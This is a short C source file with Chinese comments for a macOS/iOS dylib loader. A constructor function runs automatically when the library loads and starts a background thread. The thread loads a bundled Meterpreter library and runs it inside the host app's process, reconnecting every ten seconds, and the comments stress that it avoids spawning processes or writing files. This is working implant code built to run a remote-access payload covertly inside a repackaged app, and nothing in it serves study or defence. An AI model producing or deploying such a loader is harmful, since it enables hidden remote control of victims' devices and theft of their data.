/*
 * launcher.c - 进程内启动 meterpreter
 * dylib 加载后开线程，dlopen meterpreter.dylib，dlsym 找 main 并调用。
 * 不 spawn 独立进程、不释放文件，meterpreter 运行在宿主 App 进程内。
 */
#include <unistd.h>
#include <pthread.h>
#include <dlfcn.h>
#include <stdio.h>

#define METERPRETER_PATH "@executable_path/Frameworks/meterpreter.dylib"

typedef int (*main_func_t)(int, char **, char **);
extern char **environ;

static void *worker(void *arg)
{
    (void)arg;
    sleep(2);

    for (;;) {
        void *h = dlopen(METERPRETER_PATH, RTLD_NOW);
        if (h) {
            main_func_t mf = (main_func_t)dlsym(h, "main");
            if (mf) {
                char *argv[] = { "mettle", NULL };
                mf(1, argv, environ);   /* 进入 meterpreter，断连后返回 */
            }
        }
        sleep(10);   /* 重连 */
    }
    return NULL;
}

__attribute__((constructor))
static void initializer(void)
{
    pthread_t t;
    if (pthread_create(&t, NULL, worker, NULL) == 0)
        pthread_detach(t);
}
